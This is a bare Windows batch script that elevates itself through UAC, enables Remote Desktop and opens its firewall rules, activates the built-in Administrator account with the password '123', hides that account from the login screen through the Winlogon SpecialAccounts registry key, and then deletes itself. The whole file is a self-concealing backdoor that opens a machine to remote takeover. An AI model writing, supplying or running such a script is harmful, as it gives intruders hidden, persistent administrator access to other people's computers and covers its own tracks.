@echo off
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes >nul
net user Administrator /active:yes
net user Administrator 123
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Administrator>>"%temp%\run.bat"
del %0 | exit